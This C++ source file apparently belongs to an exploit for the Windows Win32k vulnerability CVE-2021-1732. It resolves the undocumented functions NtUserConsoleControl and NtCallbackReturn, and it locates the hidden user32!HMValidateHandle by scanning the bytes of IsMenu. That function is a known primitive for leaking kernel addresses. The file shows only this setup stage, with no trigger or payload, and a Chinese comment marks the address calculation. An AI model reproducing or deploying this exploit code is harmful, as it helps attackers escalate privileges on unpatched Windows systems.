#include "include/core/def.hpp"


namespace CVE_2021_1732
{
    bool initAPI() {
        auto ntdll = GetModuleHandleA("ntdll.dll");
        auto win32u = GetModuleHandleA("win32u.dll");
        if (!ntdll || !win32u) {
            std::cerr << "[!] cant load lib: ntdll.dll or win32u\n";
            return false;
        }
        NtUserConsoleControl = (FNtUserConsoleControl)GetProcAddress(win32u, "NtUserConsoleControl");
        NtCallbackReturn = (FNtCallbackReturn)GetProcAddress(ntdll, "NtCallbackReturn");
        FindHMValidateHandle(&HMValidateHandle);
        if (!NtUserConsoleControl
            || !NtCallbackReturn
            || !HMValidateHandle) {
            std::cerr << "[!] cant load functions\n";
            return false;
        }
        return true;
    }

    bool FindHMValidateHandle(FHMValidateHandle* pfOutHMValidateHandle) {
        *pfOutHMValidateHandle = nullptr;
        HMODULE hUser32 = GetModuleHandle(L"user32.dll");
        PBYTE pMenuFunc = (PBYTE)GetProcAddress(hUser32, "IsMenu");    // user32!IsMenu
        if (pMenuFunc) {
            for (int i = 0; i < 0x100; ++i) {
                if (0xe8 == *pMenuFunc++) {
                    DWORD ulOffset = *(PINT)pMenuFunc;
                    *pfOutHMValidateHandle = (FHMValidateHandle)(pMenuFunc + 5 + (ulOffset & 0xffff) - 0x10000 - ((ulOffset >> 16 ^ 0xffff) * 0x10000));    // 计算得到 user32!HMValidateHandle 地址
                    break;
                }
            }
        }
        return *pfOutHMValidateHandle != nullptr ? true : false;
    }

} // namespace CVE_2021_1732